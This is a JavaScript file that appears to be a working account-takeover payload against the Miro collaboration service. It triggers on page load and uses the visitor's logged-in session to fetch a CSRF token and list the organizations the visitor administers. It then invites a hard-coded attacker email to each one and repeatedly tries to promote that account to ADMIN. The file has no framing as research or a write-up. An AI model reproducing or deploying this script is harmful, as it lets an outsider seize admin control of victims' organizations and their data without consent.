const hackerMail = "romar.kyron@malldrops.com";

async function getCsrf() {
  console.log("Fetching CSRF token...");
  const res = await fetch("https://miro.com/api/v1/csrf", {
    method: "POST",
    credentials: "include",
  });
  const json = await res.json();
  console.log("Received CSRF token:", json.token);
  return json.token;
}

async function getOrgAdmin() {
  console.log("Fetching organizations with ADMIN role...");
  const res = await fetch("https://miro.com/api/v1/accounts?fields=id%2Crole", {
    method: "GET",
    credentials: "include",
  });
  const json = await res.json();
  const orgIds = [];
  for (const elem of json.data) {
    if (elem.role && elem.role.toUpperCase().includes("ADMIN")) {
      if (elem.organization && elem.organization.id) {
        orgIds.push(elem.organization.id);
        console.log(`Found ADMIN role in organization ID: ${elem.organization.id}`);
      }
    }
  }
  if (orgIds.length === 0) {
    console.log("No organizations with ADMIN role found.");
  }
  return orgIds;
}

async function invite(orgId, csrfToken) {
  console.log(`Sending invite to ${hackerMail} on org ${orgId}...`);
  const data = {
    emails: [hackerMail],
    channel: "EMAIL",
    membersFlowContext: {
      [hackerMail]: {
        entryPoint: "settings",
        type: "invite",
        feature: "email",
      },
    },
  };

  const res = await fetch(`https://miro.com/api/v1/accounts/${orgId}/invite`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-CSRF-TOKEN": csrfToken,
    },
    credentials: "include",
    body: JSON.stringify(data),
  });

  if (res.ok) {
    console.log(`Invite sent successfully for org ${orgId}`);
  } else {
    console.log(`Failed to send invite for org ${orgId}`);
  }
  return res.ok;
}

async function adminEscalation(orgIds, csrfToken) {
  for (const orgId of orgIds) {
    console.log(`Fetching user connections for org ${orgId} to find hack ID...`);
    const userConnRes = await fetch(
      `https://miro.com/api/v1/accounts/${orgId}/user-connections?fields=id&search=${encodeURIComponent(
        hackerMail
      )}&limit=500&offset=0`,
      {
        method: "GET",
        credentials: "include",
      }
    );

    const userConnJson = await userConnRes.json();
    if (userConnJson.size === 0 || !userConnJson.data[0]?.id) {
      console.log(`No user connection found for ${hackerMail} in org ${orgId}`);
      continue;
    }

    const hackId = userConnJson.data[0].id;
    console.log(`Found hack ID ${hackId} for org ${orgId}`);

    let success = false;
    while (!success) {
      console.log(`Trying to escalate to ADMIN on org ${orgId} for user connection ${hackId}...`);
      const putRes = await fetch(
        `https://miro.com/api/v1/accounts/${orgId}/user-connections/${hackId}/?role=ADMIN`,
        {
          method: "PUT",
          headers: {
            "X-CSRF-TOKEN": csrfToken,
          },
          credentials: "include",
        }
      );

      const putJson = await putRes.json();
      if (putJson.success === true) {
        console.log(`Successfully escalated to ADMIN on org ${orgId}`);
        success = true;
      } else {
        console.log(`Escalation failed on org ${orgId}, retrying in 1s...`);
        await new Promise((r) => setTimeout(r, 1000));
      }
    }
  }
}

window.addEventListener("load", async () => {
  console.log("Page loaded. Starting workflow...");
  try {
    const csrfToken = await getCsrf();
    const orgIds = await getOrgAdmin();

    for (const orgId of orgIds) {
      await invite(orgId, csrfToken);
    }

    await adminEscalation(orgIds, csrfToken);

    console.log("Workflow finished.");
  } catch (err) {
    console.error("Error during workflow:", err);
  }
});
